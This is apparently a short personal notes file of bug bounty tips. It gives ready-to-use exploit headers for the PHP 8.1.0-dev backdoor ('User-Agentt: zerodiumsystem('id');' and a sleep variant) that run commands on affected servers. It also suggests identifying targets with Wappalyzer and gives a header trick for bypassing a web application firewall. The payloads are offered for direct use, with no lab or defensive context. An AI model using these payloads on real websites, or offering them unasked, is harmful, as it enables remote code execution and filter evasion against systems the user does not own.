---
title: Bug Bounty Tip's
aliases:
  - Bug Bounty Tip's
---
# RCE & SQLi

If you find any website PHP 8.1.0-dev, try
```
User-Agentt: zerodiumsleep(5);  
User-Agentt: zerodiumsystem('id');  
```
  
This is prettiest flaw in 8.1.0.
Use Wappalyzer to see technologies used by WebApp
![[images/Pasted image 20250422103313.png]]

## WAFBYPASS

Bypass with `Contant-Encoding: WAFBYPASS` in request.
![[images/Pasted image 20250630122936.png]]